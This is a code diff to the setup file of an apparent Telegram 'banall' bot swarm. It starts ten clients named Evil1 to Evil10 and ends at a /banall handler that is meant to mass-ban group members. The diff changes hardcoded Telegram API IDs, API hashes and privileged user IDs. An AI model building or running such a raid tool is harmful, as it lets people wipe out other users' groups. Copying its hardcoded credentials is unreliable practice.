@@ -20,9 +20,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
-ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
-SUDO_USERS.append(5518687442)
+EVILS = [6123932615]
+ALTRONS = [-1001985992318]
+SUDO_USERS.append(6123932615)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -37,16 +37,16 @@ RIGHTS = ChatBannedRights(
 )
 
 logging.basicConfig(level=logging.INFO)
-Evil1 = TelegramClient('EVIL1', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN1)
-Evil2 = TelegramClient('EVIL2', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN2)
-Evil3 = TelegramClient('EVIL3', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN3)
-Evil4 = TelegramClient('EVIL4', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN4)
-Evil5 = TelegramClient('EVIL5', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN5)
-Evil6 = TelegramClient('EVIL6', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN6)
-Evil7 = TelegramClient('EVIL7', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN7)
-Evil8 = TelegramClient('EVIL8', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN8)
-Evil9 = TelegramClient('EVIL9', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN9)
-Evil10 = TelegramClient('EVIL10', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN10)
+Evil1 = TelegramClient('EVIL1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
+Evil2 = TelegramClient('EVIL2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
+Evil3 = TelegramClient('EVIL3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
+Evil4 = TelegramClient('EVIL4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
+Evil5 = TelegramClient('EVIL5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
+Evil6 = TelegramClient('EVIL6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
+Evil7 = TelegramClient('EVIL7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
+Evil8 = TelegramClient('EVIL8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
+Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
+Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
 
 
 @Evil1.on(events.NewMessage(pattern="^/banall"))
